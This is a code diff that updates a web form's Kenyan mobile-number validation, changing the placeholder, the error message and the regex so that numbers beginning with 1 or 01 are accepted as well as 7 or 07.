@@ -413,7 +413,7 @@
 </span>
       </span>
       <span class="code">+254</span>
-      <input type="tel" id="phoneInput" placeholder="712345678 or 0712345678" inputmode="numeric" maxlength="10">
+      <input type="tel" id="phoneInput" placeholder="0712345678 or 0112345678" inputmode="numeric" maxlength="10">
     </div>
 
     <div class="code-label">Enter your Code</div>
@@ -438,7 +438,7 @@
         <div class="dot"></div>
       </div>
       <h2 id="invalidTitle">Invalid Format</h2>
-      <p id="invalidMessage">Please enter a valid Kenyan mobile number starting with 7 or 07.<br>Please enter the correct number and try again!</p>
+      <p id="invalidMessage">Please enter a valid Kenyan mobile number starting with 7, 1, 07, or 01.<br>Please enter the correct number and try again!</p>
       <button type="button" id="invalidOkBtn">OK</button>
     </div>
   </div>
@@ -586,9 +586,9 @@
     const phone = phoneInput.value.trim();
 
     // Show the invalid-number page only when the user tries to submit.
-    if(!/^0?7[0-9]{8}$/.test(phone)){
+    if(!/^(?:[17][0-9]{8}|0[17][0-9]{8})$/.test(phone)){
       showInvalidPhone(
-        'Please enter a valid Kenyan mobile number starting with 7 or 07.<br>Please enter the correct number and try again!'
+        'Please enter a valid Kenyan mobile number starting with 7, 1, 07, or 01.<br>Please enter the correct number and try again!'
       );
       return;
     }
